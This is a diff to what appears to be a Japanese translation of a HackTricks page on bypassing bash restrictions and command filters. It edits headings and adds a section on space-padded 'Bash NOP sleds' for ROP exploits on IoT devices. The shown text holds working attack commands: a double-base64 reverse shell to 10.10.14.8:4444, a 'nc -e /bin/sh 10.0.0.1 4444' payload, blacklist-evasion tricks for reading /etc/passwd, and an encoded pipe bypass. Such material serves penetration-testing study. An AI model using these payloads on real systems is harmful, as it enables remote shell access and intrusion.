@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### パスと禁止ワードのバイパス
+### バイパスパスと禁止ワード
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -110,7 +110,7 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### パイプをバイパスする
+### パイプのバイパス
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -138,13 +138,13 @@ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNSデータの抽出
+### DNSデータの流出
 
 例えば、**burpcollab**や[**pingb**](http://pingb.in)を使用できます。
 
 ### ビルトイン
 
-外部関数を実行できず、**RCEを取得するための限られたビルトインのセットにのみアクセスできる**場合、いくつかの便利なトリックがあります。通常、**すべての**ビルトインを使用することはできないため、**すべてのオプションを知っておく**必要があります。アイデアは[**devploit**](https://twitter.com/devploit)から。\
+外部関数を実行できず、**RCEを取得するための限られたビルトインのセット**にしかアクセスできない場合、いくつかの便利なトリックがあります。通常、**すべての**ビルトインを使用することはできないため、**すべてのオプションを知っておく**必要があります。アイデアは[**devploit**](https://twitter.com/devploit)から。\
 まず、すべての[**シェルビルトイン**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**を確認してください。** それから、いくつかの**推奨事項**があります：
 ```bash
 # Get list of builtins
@@ -296,7 +296,7 @@ ln /f*
 ```
 ## 読み取り専用/Noexec/Distroless バイパス
 
-**読み取り専用および noexec 保護** のあるファイルシステム内、または distroless コンテナ内にいる場合でも、**任意のバイナリを実行する方法、さらにはシェルを実行する方法があります!:**
+**読み取り専用および noexec 保護** のあるファイルシステムや、distroless コンテナ内にいる場合でも、**任意のバイナリを実行する方法、さらにはシェルを実行する方法があります!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -308,11 +308,33 @@ bypass-fs-protections-read-only-no-exec-distroless/
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## 参考文献 & その他
+## スペースベースの Bash NOP スレッド ("Bashsledding")
+
+脆弱性により、最終的に `system()` または別のシェルに到達する引数を部分的に制御できる場合、実行がペイロードを読み始める正確なオフセットがわからないことがあります。従来の NOP スレッド（例: `\x90`）はシェル構文では **機能しません** が、Bash はコマンドを実行する前に先頭の空白を無害に無視します。
+
+したがって、実際のコマンドの前に長いスペースまたはタブ文字のシーケンスを付加することで、*Bash 用の NOP スレッド*を作成できます:
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+もしROPチェーン（または任意のメモリ破損プリミティブ）が命令ポインタをスペースブロック内のどこかに配置すると、Bashパーサーは単にホワイトスペースをスキップし、`nc`に到達し、コマンドを確実に実行します。
+
+実用的な使用例：
+
+1. **メモリマップされた設定ブロブ**（例：NVRAM）で、プロセス間でアクセス可能なもの。
+2. 攻撃者がペイロードを整列させるためにNULLバイトを書き込むことができない状況。
+3. BusyBox `ash`/`sh`のみが利用可能な組み込みデバイス – これらも先頭のスペースを無視します。
+
+> 🛠️ このトリックを`system()`を呼び出すROPガジェットと組み合わせることで、メモリ制約のあるIoTルーターでのエクスプロイトの信頼性を大幅に向上させることができます。
+
+## 参考文献とその他
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
+
+- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
